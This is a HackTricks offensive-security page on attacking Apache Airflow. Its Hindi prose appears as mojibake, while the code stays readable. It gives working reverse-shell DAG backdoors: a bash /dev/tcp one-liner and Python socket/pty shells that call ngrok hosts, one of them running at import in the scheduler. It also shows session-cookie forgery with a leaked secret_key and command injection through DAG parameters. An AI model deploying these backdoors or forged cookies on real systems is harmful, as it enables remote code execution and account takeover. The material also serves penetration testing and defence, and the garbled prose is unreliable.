# Apache Airflow рд╕реБрд░рдХреНрд╖рд╛

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред**

</details>

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

[**Apache Airflow**](https://airflow.apache.org) **рдбреЗрдЯрд╛ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдпрд╛ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреА рдЕрдиреБрд╕реВрдЪрд┐рдд рдХрд░рдиреЗ рдФрд░ рд╕рдВрдЧрдарди** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдбреЗрдЯрд╛ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреА рд╕рдВрдЧрдарди рдХрд░рдиреЗ рдХрд╛ рдорддрд▓рдм рд╣реИ, рд╡рд┐рднрд┐рдиреНрди рд╕реНрд░реЛрддреЛрдВ рд╕реЗ рдбреЗрдЯрд╛ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рдХреНрд░рдордмрджреНрдз, рд╕рдордиреНрд╡рдп, рдЕрдиреБрд╕реВрдЪрд┐рдд рдХрд░рдирд╛ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдирд╛ред рдпреЗ рдбреЗрдЯрд╛ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рд╡реНрдпрд╛рдкрд╛рд░ рдмреБрджреНрдзрд┐рдорддреНрддрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рдбреЗрдЯрд╛ рд╡рд┐рдЬреНрдЮрд╛рди, рдорд╢реАрди рд▓рд░реНрдирд┐рдВрдЧ рдореЙрдбрд▓реНрд╕ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдбреЗрдЯрд╛ рд╕реЗрдЯ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдмрдбрд╝реЗ рдбреЗрдЯрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВред

рдореВрд▓ рд░реВрдк рд╕реЗ, Apache Airflow рдЖрдкрдХреЛ рдХреЛрдб рдХреЗ **рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди рдХреА рдЕрдиреБрд╕реВрдЪрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ рдЬрдм рдХреБрдЫ рд╣реЛрддрд╛ рд╣реИ** (рдЗрд╡реЗрдВрдЯ, cron)ред

## рд╕реНрдерд╛рдиреАрдп рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛

### рдбреЙрдХрд░-рдХрдВрдкреЛрдЬ

рдЖрдк **рдбреЙрдХрд░-рдХрдВрдкреЛрдЬ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) рдПрдХ рдкреВрд░реНрдг Apache Airflow рдбреЙрдХрд░ рдкрд░реНрдпрд╛рд╡рд░рдг рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред (рдпрджрд┐ рдЖрдк MacOS рдореЗрдВ рд╣реИрдВ, рддреЛ рдбреЙрдХрд░ VM рдХреЛ рдХрдо рд╕реЗ рдХрдо 6GB рд░реИрдо рджреЗрдВред)

### рдорд┐рдиреАрдХреНрдпреВрдм

рдПрдХ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ Apache Airflow рдХреЛ рдЪрд▓рд╛рдиреЗ рдХрд╛ рд╣реИ, рдЙрд╕реЗ **рдорд┐рдиреАрдХреНрдпреВрдм рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдирд╛**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди

Airflow рдЕрдкрдиреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдЖрдкрдХреЛ рдХрдордЬреЛрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдорд┐рд▓ рд╕рдХрддреА рд╣реИ:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Airflow рдХреЛ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЖрдкрдХреЛ рд╕рдордЭрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ **рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддреА рд╣реИрдВ**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## рд╣рдорд▓реЗ

### рд╡реЗрдм рдХрдВрд╕реЛрд▓ рдЬрд╛рдБрдЪ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд╡реЗрдм рдХрдВрд╕реЛрд▓ рддрдХ рдкрд╣реБрдВрдЪ** рд╣реИ рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬрд╛рдирдХрд╛рд░реА рдореЗрдВ рд╕реЗ рдХреБрдЫ рдпрд╛ рд╕рднреА рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:

* **рдЪрд░** (рдпрд╣рд╛рдВ рдХрд╕реНрдЯрдо рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ)
* **рдХрдиреЗрдХреНрд╢рди** (рдпрд╣рд╛рдВ рдХрд╕реНрдЯрдо рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ)
* рдЗрдиреНрд╣реЗрдВ `http://<airflow>/connection/list/` рдореЗрдВ рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдВ
* [**рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди**](./#airflow-configuration) (рдпрд╣рд╛рдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЬреИрд╕реЗ **`secret_key`** рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╣реЛ рд╕рдХрддреА рд╣реИ)
* рд╕реВрдЪреА рдореЗрдВ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рднреВрдорд┐рдХрд╛рдПрдБ**
* рдкреНрд░рддреНрдпреЗрдХ DAG рдХрд╛ **рдХреЛрдб** (рдЬрд┐рд╕рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рд╣реЛ рд╕рдХрддреА рд╣реИ)

### рдЪрд░реЛрдВ рдХреЗ рдорд╛рди рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

Airflow рдореЗрдВ рдЪрд░ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **DAGs** рдЙрдирдХреЗ рдорд╛рдиреЛрдВ рддрдХ **рдкрд╣реБрдВрдЪ** рдкрд╛ рд╕рдХреЗрдВред рдЗрд╕реЗ рдЕрдиреНрдп рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдореЛрдВ рдХреЗ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЗ рд╕рдорд╛рди рдорд╛рдирд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВ рддреЛ рдЖрдк рдЙрдиреНрд╣реЗрдВ GUI рдореЗрдВ `http://<airflow>/variable/list/` рдореЗрдВ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
Airflow рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЪрд░ рдХреЗ рдорд╛рди рдХреЛ GUI рдореЗрдВ рджрд┐рдЦрд╛рдПрдЧрд╛, рд╣рд╛рд▓рд╛рдВрдХрд┐, [**рдЗрд╕**](https://marclamberti.com/blog/variables-with-apache-airflow/) рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдк рдПрдХ **рдЪрд░реЛрдВ рдХреА рд╕реВрдЪреА** рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдирдХреЗ **рдорд╛рди** GUI рдореЗрдВ **рдПрд╕реНрдЯреНрд░рд┐рдХреНрд╕** рдХреЗ рд░реВрдк рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрдВрдЧреЗред

![](<../../.gitbook/assets/image (79).png>)

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпреЗ **рдорд╛рди** рдЕрдм рднреА **CLI** (рдЖрдкрдХреЛ рдбреЗрдЯрд╛рдмреЗрд╕ рдПрдХреНрд╕реЗрд╕ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП), **рдЕрдирд┐рдпрдорд┐рдд DAG** рдирд┐рд╖реНрдкрд╛рджрди, **API** рдЬреЛ рдЪрд░реЛрдВ рдХреЗ рдПрдВрдбрдкреЙрдЗрдВрдЯ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ (рдПрдкреАрдЖрдИ рд╕рдХреНрд░рд┐рдп рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП), рдФрд░ **рдпрд╣рд╛рдВ рддрдХ рдХрд┐ GUI рдЦреБрдж рд╕реЗ рднреА!**\
**GUI** рд╕реЗ рдЙрди рдорд╛рдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╕ **рдЪрд░реЛрдВ рдХреЛ рдЪреБрдиреЗрдВ** рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдПрдХреНрд╕реЗрд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдФрд░ **рдХрд╛рд░реНрд░рд╡рд╛рдИ -> рдирд┐рд░реНрдпрд╛рдд** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред\
рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ **рдЫрд┐рдкреЗ рд╣реБрдП рдорд╛рди** рдХреЛ **рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕** рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛, рдЬрд┐рд╕рдореЗрдВ рдЖрдкрдХреЛ рдЗрд╕реЗ рдЦреЛрдЬ рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

![](<../../.gitbook/assets/image (30).png>)

### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди

рдпрджрд┐ **`expose_config`** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ **True** рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **рдпреВрдЬрд╝рд░ рд░реЛрд▓** рдФрд░ **рдКрдкрд░** рд╕реЗ рд╡реЗрдм рдореЗрдВ **рдХреЙрдиреНрдлрд╝рд┐рдЧ** рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдореЗрдВ, **`secret_key`** рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЗрд╕ рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рд╡реЗ рдЕрдкрдиреА рдЦреБрдж рдХреА рд╕рд╛рдЗрди рдХреА рдХреБрдХреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG рдмреИрдХрдбреЛрд░ (Airflow worker рдореЗрдВ RCE)

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **DAGs рд╕рд╣реЗрдЬреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕реНрдерд╛рди** рдореЗрдВ **рд▓реЗрдЦрди рдХрд╛ рдЕрдзрд┐рдХрд╛рд░** рд╣реИ, рддреЛ рдЖрдк рдмрд╕ рдПрдХ рдРрд╕рд╛ **рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ рдЖрдкрдХреЛ рдПрдХ **рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рднреЗрдЬреЗрдЧрд╛ред**\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ **рдПрдХ airflow worker container** рдХреЗ рднреАрддрд░ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛**:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG рдмреИрдХрдбреЛрд░ (Airflow рд╕реНрдХреЗрдбреНрдпреВрд▓рд░ рдореЗрдВ RCE)

рдпрджрд┐ рдЖрдк рдХреБрдЫ рдХреЛрдб рдХреЗ **рд░реВрдЯ рдореЗрдВ рдирд┐рд░реНрдзрд╛рд░рд┐рдд** рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕ рд▓реЗрдЦ рдХреЗ рд▓рд┐рдП рд▓рд┐рдЦрдиреЗ рдХреЗ рд╕рдордп рдкрд░, рдпрд╣ **рд╕реНрдХреЗрдбреНрдпреВрд▓рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛрдЧрд╛ рдФрд░ рдЗрд╕реЗ DAG рдХреЗ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд░рдЦрдиреЗ рдХреЗ рдХреБрдЫ рд╕реЗрдХрдВрдбреЛрдВ рдХреЗ рдмрд╛рджред
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG рдирд┐рд░реНрдорд╛рдг

рдпрджрд┐ рдЖрдкрдХреЛ DAG рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рдХреА рдорд╢реАрди рдХреЛ рд╣рдерд┐рдпрд╛ рд▓реЗрдиреЗ рдореЗрдВ рд╕рдлрд▓рддрд╛ рдорд┐рд▓рддреА рд╣реИ, рддреЛ рдЖрдк `dags/` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдирдП DAG рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡реЗ DAG рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдиреНрдп рдорд╢реАрдиреЛрдВ рдореЗрдВ рдирдХрд▓ рдХреА рдЬрд╛рдПрдВрдЧреАред

### DAG рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди

рдЬрдм рдЖрдк GUI рд╕реЗ DAG рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕реЗ **рдЖрд░реНрдЧреНрдпреВрдореЗрдВрдЯреНрд╕** рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ DAG рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХреЛрдб рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдпрд╣ **рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИред**\
рдпрд╣реА рд╣реБрдЖ рдерд╛ рдЗрд╕ CVE рдореЗрдВ: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

DAG рдореЗрдВ **рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХреА рдЦреЛрдЬ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЬрд╛рдирдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реИ рдХрд┐** **рдкреИрд░рд╛рдореАрдЯрд░реНрд╕** рдХреЛрдб **`dag_run.conf.get("param_name")`** рдХреЗ рд╕рд╛рде **рдПрдХреНрд╕реЗрд╕ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ**ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╡рд╣реА рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрддрддрд╛ GUI рдореЗрдВ **рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕** рдХреЗ рд╕рд╛рде рднреА рд╣реЛ рд╕рдХрддреА рд╣реИ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд░реНрдпрд╛рдкреНрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдЖрдк GUI рдореЗрдВ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЗ рдорд╛рди рдХреЛ **рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**)ред рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ **рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдЗрд╕рдХреЗ рд╕рд╛рде:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
рдпрджрд┐ рд╡реЗ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдмреИрд╢ рдХрдорд╛рдВрдб рдХреЗ рдЕрдВрджрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ рдкреАрдбреАрдПрдл рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**, рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**рдж рдкреАрдПрд╕ рдлреИрдорд┐рд▓реА**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░реЗрдкреЛ рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
